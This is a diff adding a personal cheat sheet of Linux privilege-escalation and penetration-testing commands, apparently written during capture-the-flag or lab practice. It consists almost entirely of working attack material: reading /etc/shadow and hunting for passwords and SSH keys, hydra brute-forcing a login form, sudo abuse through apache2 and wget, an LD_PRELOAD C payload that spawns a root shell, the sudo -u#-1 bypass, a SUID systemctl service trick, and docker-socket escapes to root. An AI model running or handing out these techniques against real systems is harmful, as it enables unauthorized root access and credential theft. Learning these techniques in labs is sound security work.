@@ -1,0 +1,99 @@
+howami
+hostname
+id -> user group ...
+sudo -l > to view commands that user can run as root
+cat /etc/passwd
+cat /etc/shadow
+cat /etc/passwd | cut -d : -f 1
+cat/etc/group
+history
+sudo su - -> to check if user can sudo the su 
+uname -a 
+cat /proc/version
+cat /etc/issue
+lscpu > spu used etc...
+ps aux > executing tasks (what task are runing with root)
+
+
+Netwok  
+ifconfig
+ip -a    (check if machine can connect to different machines)
+ip rooute
+arp -a > to know what machines we are talking with 
+ip neigh > to know what machines we are talking with 
+netstate -ano -> view machine connexions /view opned ports /view connected hosts (look for ports open to 127.0.0.1 ? why )
+
+grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null >> look for passwords 
+
+
+locate password | more
+locate pass | more
+
+
+
+find / -name authorized_keys 2> /dev/null
+find / -name id_rsa 2> /dev/null
+
+
+
+
+wget ftp://10.10.252.85/pub/ForMitch.txt
+hydra -l mich -P /usr/share/wordlists/common_me.txt 10.10.252.85 http-post-form "/simple/admin/login.php:username=^USER^&password=^PASS^&loginsubmit=Submit:User name or password incorrect" -V -F
+
+
+username=mitch&password=313131&loginsubmit=Submit
+hydra -l mich -P /usr/share/wordlists/common_me.txt 10.10.252.85 http-post-form "/simple/admin/login.php:username=^USER^&password=^PASS^&loginsubmit=Submit:User name or password incorrect"
+
+sudo apache2 -f /etc/shadow 
+sudo wget --pot-file=/etc/shadow 192.168.0.1 
+
+ld_preload --------------
+
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+void _init() {
+unsetenv("LD_PRELOAD");
+setgid(0);
+setuid(0);
+system("/bin/sh");
+}
+--------------- compile and executing
+gcc -fPIC -shared -o shell.so shell.c -nostartfiles
+ls -al shell.so
+sudo LD_PRELOAD=/tmp/shell.so find(command sudo)
+id
+whoami
+--------------  New Vulnerability 
+sudo -V
+
+(ALL, !root) /bin/bash
+sudo -u#-1 /bin/bash
+
+sudo -u#-2 /bin/bash
+>>>>>>>< New culnerability 
+cat /etc/sudoers   -> search for pwvfeedback
+look if sudo return a pass as stars
+
+setuid
+find / -perm -u=s -type f 2>/dev/null
+
+------------------------------------------------------------
+sudo install -m =xs $(which systemctl) .
+
+TF=$(mktemp).service
+echo '[Service]
+Type=onesh
+ExecStart=/bin/bash -c "cat /root/users.txt  > /tmp/output"
+[Install]
+WantedBy=multi-user.target' > $TF
+./systemctl link $TF
+./systemctl enable --now $TF
+http://ultratech.kal:31331/
+wfuzz -c -w subdomains-top1million-5000.txt -u http://ultratech.kal:31331 -H "Host: FUZZ.ultratech.kal"
+*-----------------------------
+docker
+docker images   to view images 
+docker -H unix:///var/run/docker.sock run -v /:/host -it 495d6437fc1e chroot /host /bin/bash             To get rrot 
+docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
+
